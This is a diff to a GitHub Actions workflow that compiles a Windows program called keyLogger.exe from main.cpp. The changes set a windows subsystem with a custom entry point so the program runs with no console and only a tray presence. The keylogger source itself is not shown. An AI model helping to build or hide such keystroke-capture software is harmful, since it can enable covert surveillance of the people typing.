@@ -1,4 +1,4 @@
-name: Build KeyLogger EXE (Pure Win32)
+name: Build KeyLogger EXE (Pure Win32 - Tray Only)
 
 on:
   push:
@@ -17,12 +17,11 @@ jobs:
 
     - name: Setup MSVC Developer Command Prompt
       uses: ilammy/msvc-dev-cmd@v1
-      # No parameters needed — works on windows-latest (VS 2022) as of Feb 2026
 
     - name: Create build directory
       run: mkdir build
 
-    - name: Compile & Link (pure Win32, no Qt)
+    - name: Compile & Link (no console, uses main() with custom entry)
       working-directory: build
       shell: cmd
       run: |
@@ -31,11 +30,11 @@ jobs:
           /W3 /wd4189 /wd4577 ^
           ..\main.cpp ^
           /link /NOLOGO /DYNAMICBASE /NXCOMPAT /OPT:REF /OPT:ICF ^
-          /SUBSYSTEM:WINDOWS ^
+          /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup ^
           user32.lib shell32.lib gdi32.lib advapi32.lib ^
           /OUT:keyLogger.exe
 
-    - name: Upload KeyLogger.exe
+    - name: Upload KeyLogger.exe artifact
       uses: actions/upload-artifact@v4
       with:
         name: KeyLogger-Release
